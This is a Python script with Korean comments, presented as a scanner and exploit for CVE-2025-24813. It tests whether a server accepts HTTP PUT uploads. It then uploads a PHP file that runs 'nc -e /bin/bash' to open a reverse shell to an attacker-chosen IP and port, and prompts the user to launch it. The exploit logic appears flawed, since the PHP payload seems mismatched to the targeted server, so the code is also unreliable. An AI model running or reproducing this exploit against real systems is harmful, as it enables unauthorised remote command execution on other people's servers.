import requests


# 1. CVE-2025-24813 진단 함수 (취약점 확인)
def detect_cve_2025_24813(target_url):
    test_path = "/test_upload_cve2025.txt"
    test_content = "CVE-2025-24813 Test"

    # 1단계: 텍스트 파일 생성
    with open('test_upload_cve2025.txt', 'w') as file:
        file.write(test_content)

    try:
        # 2단계: PUT 요청 시도 (파일 업로드)
        with open('test_upload_cve2025.txt', 'rb') as file:
            put_response = requests.put(target_url + test_path, data=file, timeout=5)

        if put_response.status_code in [200, 201, 204]:
            # 3단계: 업로드한 파일을 GET 요청으로 확인
            get_response = requests.get(target_url + test_path, timeout=5)
            if get_response.status_code == 200 and test_content in get_response.text:
                return {
                    "status": "vulnerable",
                    "info": "파일 업로드 및 조회 성공. DefaultServlet 쓰기 권한 활성화 의심됨."
                }
            else:
                return {
                    "status": "potentially_vulnerable",
                    "info": "업로드 성공했으나 조회 실패. 확인 필요."
                }
        else:
            return {
                "status": "not_vulnerable",
                "info": f"PUT 요청 실패. 상태 코드: {put_response.status_code}"
            }
    except Exception as e:
        return {
            "status": "error",
            "info": f"요청 중 오류 발생: {str(e)}"
        }


# 2. CVE-2025-24813 익스플로잇 함수 (리버스 쉘)
def exploit_cve_2025_24813(target_url, reverse_shell_ip, reverse_shell_port):
    """
    파일을 업로드하고 해당 파일을 통해 리버스 쉘을 활성화시킴
    """
    # 1단계: 악성 페이로드 파일 업로드
    exploit_file = f"""<?php
    exec("nc -e /bin/bash {reverse_shell_ip} {reverse_shell_port}");
    ?>
    """
    try:
        response = requests.put(target_url + "/test_upload_cve2025_shell.php", data=exploit_file)
        if response.status_code in [200, 201, 204]:
            print("[+] 파일 업로드 성공: 악성 파일을 업로드했습니다.")

            # 2단계: 업로드한 파일 실행
            reverse_shell_url = target_url + "/test_upload_cve2025_shell.php"
            shell_response = requests.get(reverse_shell_url)

            if shell_response.status_code == 200:
                print("[+] 리버스 쉘 실행 성공: 쉘이 열렸습니다!")
            else:
                print("[-] 리버스 쉘 실행 실패.")
        else:
            print("[-] 파일 업로드 실패.")
    except Exception as e:
        print(f"[-] 오류 발생: {str(e)}")


# 3. 메인 함수
def main():
    print("🔍 CVE-2025-24813 진단기 및 익스플로잇")

    target = input("대상 URL 입력 (예: http://192.168.0.100:8080): ").strip()

    if not target.startswith("http"):
        print("[!] 올바른 URL 형식이 아닙니다.")
        return

    # CVE-2025-24813 진단 실행
    result = detect_cve_2025_24813(target)
    print(f"[결과] {result['status']}")
    print(f"[정보] {result['info']}")

    # 취약점이 확인되면 익스플로잇 실행
    if result['status'] == 'vulnerable' or result['status'] == 'potentially_vulnerable':
        exploit_choice = input("[!] 취약점이 확인되었습니다. 익스플로잇을 실행하시겠습니까? (y/n): ").strip().lower()
        if exploit_choice == 'y':
            reverse_shell_ip = input("리버스 쉘 연결을 위한 공격자 IP 주소 입력: ").strip()
            reverse_shell_port = input("리버스 쉘 연결을 위한 포트 입력: ").strip()
            exploit_cve_2025_24813(target, reverse_shell_ip, reverse_shell_port)
        else:
            print("[*] 익스플로잇을 실행하지 않았습니다.")


if __name__ == "__main__":
    main()
